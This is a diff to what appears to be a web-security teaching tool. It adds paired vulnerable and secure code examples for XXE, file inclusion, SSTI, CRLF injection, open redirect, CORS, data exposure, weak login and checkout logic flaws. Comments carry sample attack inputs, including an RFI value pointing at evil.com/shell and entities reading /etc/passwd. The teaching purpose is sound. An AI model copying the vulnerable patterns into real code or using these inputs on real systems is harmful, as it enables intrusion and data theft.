@@ -707,6 +707,25 @@ data = json.loads(user_input)
                 'Use SAST tools to detect XXE in source code',
                 'Implement proper error handling to avoid information disclosure'
             ],
+            'vulnerable_code': '''# Python XML Parser - VULNERABLE
+import xml.etree.ElementTree as ET
+
+def parse_xml(xml_data):
+    # VULNERABLE: Allows external entities
+    root = ET.fromstring(xml_data)
+    return root.findtext('data')
+
+# Attacker payload can read /etc/passwd:
+# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>''',
+            'solution_code': '''# Python XML Parser - SECURE
+import defusedxml.ElementTree as ET
+
+def parse_xml(xml_data):
+    # SECURE: defusedxml prevents XXE attacks
+    root = ET.fromstring(xml_data)
+    return root.findtext('data')
+
+# External entities are blocked automatically''',
             'exploit_example': '''
 ATTACK SCENARIO - XXE File Disclosure:
 1. Click "Go to exploit server" and save the following malicious DTD file on your server:
@@ -780,6 +799,36 @@ SOLUTION:
                 'Review source code comments for sensitive information',
                 'Implement proper exception handling in all code paths'
             ],
+            'vulnerable_code': '''# Flask Application - VULNERABLE
+from flask import Flask
+
+app = Flask(__name__)
+app.config['DEBUG'] = True  # VULNERABLE in production
+
+@app.route('/product/<id>')
+def get_product(id):
+    # Error shows full stack trace to user
+    product = Product.get(id)  # May raise exception
+    return product.to_json()''',
+            'solution_code': '''# Flask Application - SECURE
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+app.config['DEBUG'] = False  # SECURE
+
+@app.errorhandler(Exception)
+def handle_error(e):
+    # Log error server-side only
+    app.logger.error(f"Error: {e}")
+    return jsonify({"error": "An error occurred"}), 500
+
+@app.route('/product/<id>')
+def get_product(id):
+    try:
+        product = Product.get(id)
+        return product.to_json()
+    except Exception as e:
+        return handle_error(e)''',
             'exploit_example': '''
 ATTACK SCENARIO - Information Disclosure:
 1. Navigate to a product page with an invalid productId parameter
@@ -922,6 +971,26 @@ ERROR CODE REFERENCE:
                 'Run application with minimal file system permissions',
                 'Use chroot jails or containerization'
             ],
+            'vulnerable_code': '''# PHP Application - VULNERABLE
+<?php
+$page = $_GET['page'];
+// VULNERABLE: Direct file inclusion
+include("/var/www/pages/" . $page);
+?>
+
+<!-- Attacker: ?page=../../../../etc/passwd -->''',
+            'solution_code': '''# PHP Application - SECURE
+<?php
+$page = $_GET['page'];
+
+// SECURE: Whitelist validation
+$allowed_pages = ['home', 'about', 'contact'];
+if (!in_array($page, $allowed_pages)) {
+    die("Invalid page");
+}
+
+include("/var/www/pages/" . $page . ".php");
+?>''',
             'exploit_example': '''
 ATTACK SCENARIO - Local File Inclusion:
 1. Identify a parameter that loads files: /page.php?file=about.php
@@ -1035,6 +1104,26 @@ ERROR CODE REFERENCE:
                 'Implement strict input validation',
                 'Monitor for suspicious file inclusion attempts'
             ],
+            'vulnerable_code': '''# PHP Application - VULNERABLE
+<?php
+$module = $_GET['module'];
+// VULNERABLE: Allows remote files
+include($module . ".php");
+?>
+
+<!-- Attacker: ?module=http://evil.com/shell -->''',
+            'solution_code': '''# PHP Application - SECURE
+<?php
+$module = $_GET['module'];
+
+// SECURE: Validate and use whitelist
+$allowed = ['dashboard', 'profile', 'settings'];
+if (!in_array($module, $allowed)) {
+    die("Invalid module");
+}
+
+include(__DIR__ . "/modules/" . $module . ".php");
+?>''',
             'exploit_example': '''
 ATTACK SCENARIO - Remote File Inclusion:
 1. Find include/require with user input: include($_GET['page'])
@@ -1094,6 +1183,32 @@ ERROR CODE: CWE-98 (PHP File Inclusion)
                 'Implement Content Security Policy',
                 'Use template engines with auto-escaping enabled'
             ],
+            'vulnerable_code': '''# Flask/Jinja2 - VULNERABLE
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/hello')
+def hello():
+    name = request.args.get('name')
+    # VULNERABLE: User input in template
+    template = f"Hello {{{{{name}}}}}!"
+    return render_template_string(template)
+
+# Attacker: ?name={{config}}''',
+            'solution_code': '''# Flask/Jinja2 - SECURE
+from flask import Flask, request, render_template
+from markupsafe import escape
+
+app = Flask(__name__)
+
+@app.route('/hello')
+def hello():
+    name = request.args.get('name', '')
+    # SECURE: Use template file + escape
+    return render_template('hello.html', name=escape(name))
+
+# Template file: <h1>Hello {{ name }}!</h1>''',
             'exploit_example': '''
 ATTACK SCENARIO - SSTI (Jinja2 Example):
 1. Find template injection point: Hello {{name}}!
@@ -1190,6 +1305,38 @@ ERROR CODE REFERENCE:
                 'Set proper Content-Type headers',
                 'Use HTTP security headers'
             ],
+            'vulnerable_code': '''# HTTP Response - VULNERABLE
+from flask import Flask, request, Response
+
+app = Flask(__name__)
+
+@app.route('/set_lang')
+def set_language():
+    lang = request.args.get('lang')
+    # VULNERABLE: User input in header
+    response = Response("Language set")
+    response.headers['X-Language'] = lang
+    return response
+
+# Attacker: ?lang=en%0d%0aSet-Cookie: admin=true''',
+            'solution_code': '''# HTTP Response - SECURE
+from flask import Flask, request, Response
+
+app = Flask(__name__)
+
+@app.route('/set_lang')
+def set_language():
+    lang = request.args.get('lang', '')
+    # SECURE: Remove CRLF characters
+    lang = lang.replace('\r', '').replace('\n', '')
+    
+    # Validate against whitelist
+    if lang not in ['en', 'fr', 'es', 'de']:
+        lang = 'en'
+    
+    response = Response("Language set")
+    response.headers['X-Language'] = lang
+    return response''',
             'exploit_example': '''
 ATTACK SCENARIO - CRLF Injection:
 1. Find parameter reflected in headers
@@ -1255,6 +1402,36 @@ ERROR CODE: CWE-113 (CRLF Injection)
                 'Show warning page before external redirects',
                 'Never redirect based on unvalidated user input'
             ],
+            'vulnerable_code': '''# Redirect Handler - VULNERABLE
+from flask import Flask, request, redirect
+
+app = Flask(__name__)
+
+@app.route('/redir')
+def redirect_user():
+    # VULNERABLE: Unvalidated redirect
+    url = request.args.get('url')
+    return redirect(url)
+
+# Attacker: ?url=http://evil.com/phishing''',
+            'solution_code': '''# Redirect Handler - SECURE
+from flask import Flask, request, redirect, abort
+from urllib.parse import urlparse
+
+app = Flask(__name__)
+
+@app.route('/redir')
+def redirect_user():
+    url = request.args.get('url', '/')
+    
+    # SECURE: Validate against whitelist
+    allowed_domains = ['example.com', 'sub.example.com']
+    parsed = urlparse(url)
+    
+    if parsed.hostname not in allowed_domains:
+        abort(400, "Invalid redirect")
+    
+    return redirect(url)''',
             'exploit_example': '''
 ATTACK SCENARIO - Open Redirect:
 1. Find redirect parameter: /redirect?url=/home
@@ -1321,6 +1498,36 @@ ERROR CODE: CWE-601 (URL Redirection to Untrusted Site)
                 'Use credentials only with specific origins',
                 'Implement proper preflight request handling'
             ],
+            'vulnerable_code': '''# API Server - VULNERABLE
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+
+@app.route('/api/data')
+def get_data():
+    response = jsonify({"secret": "data"})
+    # VULNERABLE: Allows all origins
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
+    return response''',
+            'solution_code': '''# API Server - SECURE
+from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+@app.route('/api/data')
+def get_data():
+    origin = request.headers.get('Origin')
+    allowed_origins = ['https://app.example.com']
+    
+    response = jsonify({"secret": "data"})
+    
+    # SECURE: Whitelist specific origins
+    if origin in allowed_origins:
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+    
+    return response''',
             'exploit_example': '''
 ATTACK SCENARIO - CORS Misconfiguration:
 1. Website sets: Access-Control-Allow-Origin: *
@@ -1389,6 +1596,39 @@ ERROR CODE: CWE-346 (Origin Validation Error)
                 'Implement data classification and handling policies',
                 'Remove sensitive data from source code and version control'
             ],
+            'vulnerable_code': '''# User API - VULNERABLE
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+
+@app.route('/api/user/<id>')
+def get_user(id):
+    user = User.get(id)
+    # VULNERABLE: Exposes sensitive fields
+    return jsonify({
+        "id": user.id,
+        "username": user.username,
+        "email": user.email,
+        "password_hash": user.password_hash,  # EXPOSED!
+        "ssn": user.ssn,  # EXPOSED!
+        "credit_card": user.credit_card  # EXPOSED!
+    })''',
+            'solution_code': '''# User API - SECURE
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+
+@app.route('/api/user/<id>')
+def get_user(id):
+    user = User.get(id)
+    # SECURE: Only expose necessary fields
+    return jsonify({
+        "id": user.id,
+        "username": user.username,
+        "avatar_url": user.avatar_url
+    })
+    
+# Sensitive fields (password_hash, ssn, credit_card) never exposed''',
             'code_example': '''
 # Bad (Storing passwords in plain text):
 user.password = request.POST['password']
@@ -1439,6 +1679,52 @@ ERROR CODES: CWE-311, CWE-312, CWE-319
                 'Use secure password reset mechanisms',
                 'Monitor for brute force attempts'
             ],
+            'vulnerable_code': '''# Login System - VULNERABLE
+from flask import Flask, request, session
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = request.form['username']
+    pwd = request.form['password']
+    
+    # VULNERABLE: No rate limiting, weak session
+    if check_password(user, pwd):
+        session['user'] = user  # No timeout
+        return "OK"
+    return "Failed"
+
+# Allows unlimited brute force attempts''',
+            'solution_code': '''# Login System - SECURE
+from flask import Flask, request, session
+from datetime import datetime, timedelta
+import time
+
+app = Flask(__name__)
+login_attempts = {}
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    ip = request.remote_addr
+    
+    # SECURE: Rate limiting
+    if ip in login_attempts:
+        attempts, last_time = login_attempts[ip]
+        if attempts >= 5 and time.time() - last_time < 300:
+            return "Too many attempts", 429
+    
+    if check_password(username, password):
+        session['user'] = username
+        session['expires'] = datetime.now() + timedelta(hours=1)
+        login_attempts.pop(ip, None)
+        return "OK"
+    
+    # Track failed attempts
+    login_attempts[ip] = (login_attempts.get(ip, (0, 0))[0] + 1, time.time())
+    return "Failed", 401''',
             'code_example': '''
 # Bad (Weak authentication):
 if username == "admin" and password == "password":
@@ -1746,6 +2032,41 @@ IMPACT: Financial loss through refund manipulation
                 'Implement rate limiting for large orders',
                 'Add manual review for high-value orders'
             ],
+            'vulnerable_code': '''# Shopping Cart - VULNERABLE
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+@app.route('/cart/add', methods=['POST'])
+def add_to_cart():
+    item_id = request.json['item_id']
+    quantity = int(request.json['quantity'])
+    
+    # VULNERABLE: No quantity limits
+    # Attacker can order 999999 items
+    cart.add(item_id, quantity)
+    return jsonify({"status": "added"})''',
+            'solution_code': '''# Shopping Cart - SECURE
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+MAX_QTY_PER_ITEM = 100
+
+@app.route('/cart/add', methods=['POST'])
+def add_to_cart():
+    item_id = request.json['item_id']
+    quantity = int(request.json.get('quantity', 0))
+    
+    # SECURE: Enforce limits
+    if quantity < 1 or quantity > MAX_QTY_PER_ITEM:
+        return jsonify({"error": f"Quantity must be 1-{MAX_QTY_PER_ITEM}"}), 400
+    
+    # Check inventory
+    if not check_inventory(item_id, quantity):
+        return jsonify({"error": "Insufficient inventory"}), 400
+    
+    cart.add(item_id, quantity)
+    return jsonify({"status": "added"})''',
             'code_example': '''
 # Bad (No limits):
 quantity = request.POST['quantity']
@@ -1789,6 +2110,37 @@ ERROR CODE: CWE-840
                 'Prevent skipping required steps',
                 'Implement step completion verification'
             ],
+            'vulnerable_code': '''# Checkout Process - VULNERABLE
+from flask import Flask, request, session
+
+app = Flask(__name__)
+
+@app.route('/complete_order', methods=['POST'])
+def complete_order():
+    # VULNERABLE: No workflow validation
+    # User can skip payment step!
+    process_order(session['cart'])
+    return "Order completed"''',
+            'solution_code': '''# Checkout Process - SECURE
+from flask import Flask, request, session, abort
+
+app = Flask(__name__)
+
+@app.route('/complete_order', methods=['POST'])
+def complete_order():
+    # SECURE: Validate workflow state
+    if 'workflow_state' not in session:
+        abort(403, "Invalid workflow")
+    
+    if session['workflow_state'] != 'payment_confirmed':
+        abort(403, "Payment required")
+    
+    if not verify_payment(session['order_id']):
+        abort(403, "Payment not verified")
+    
+    process_order(session['cart'])
+    session['workflow_state'] = 'completed'
+    return "Order completed"''',
             'exploit_example': '''
 ATTACK SCENARIO - Workflow Bypass:
 1. Multi-step checkout: Cart → Shipping → Payment → Confirm
@@ -1845,6 +2197,48 @@ ERROR CODE: CWE-840, CWE-841
                 'Use atomic operations',
                 'Implement request deduplication'
             ],
+            'vulnerable_code': '''# Wallet Transfer - VULNERABLE
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    user_id = request.json['user_id']
+    amount = request.json['amount']
+    
+    # VULNERABLE: Race condition
+    # Two simultaneous requests can overdraw
+    balance = get_balance(user_id)
+    if balance >= amount:
+        update_balance(user_id, balance - amount)
+        return "OK"
+    return "Insufficient funds"''',
+            'solution_code': '''# Wallet Transfer - SECURE
+from flask import Flask, request
+from sqlalchemy import select
+
+app = Flask(__name__)
+
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    user_id = request.json['user_id']
+    amount = request.json['amount']
+    
+    # SECURE: Use database transaction with locking
+    with db.begin():
+        # SELECT FOR UPDATE locks the row
+        user = db.execute(
+            select(User).where(User.id == user_id).with_for_update()
+        ).scalar_one()
+        
+        if user.balance >= amount:
+            user.balance -= amount
+            db.commit()
+            return "OK"
+        else:
+            db.rollback()
+            return "Insufficient funds", 400''',
             'exploit_example': '''
 ATTACK SCENARIO - Race Condition:
 1. Limited stock item: only 1 remaining
@@ -1911,6 +2305,35 @@ ERROR CODE: CWE-362 (Race Condition)
                 'Configure secure session cookies (Secure, HttpOnly, SameSite)',
                 'Disable debug mode and verbose errors in production'
             ],
+            'vulnerable_code': '''# Flask Application - VULNERABLE
+from flask import Flask
+
+app = Flask(__name__)
+
+# VULNERABLE: No security headers
+@app.route('/')
+def index():
+    return "<h1>Welcome</h1>"
+
+# Missing: X-Frame-Options, CSP, HSTS, etc.''',
+            'solution_code': '''# Flask Application - SECURE
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.after_request
+def add_security_headers(response):
+    # SECURE: Add all security headers
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    return response
+
+@app.route('/')
+def index():
+    return "<h1>Welcome</h1>"''',
             'exploit_example': '''
 ATTACK SCENARIO - Security Misconfiguration:
 1. Missing X-Content-Type-Options: nosniff
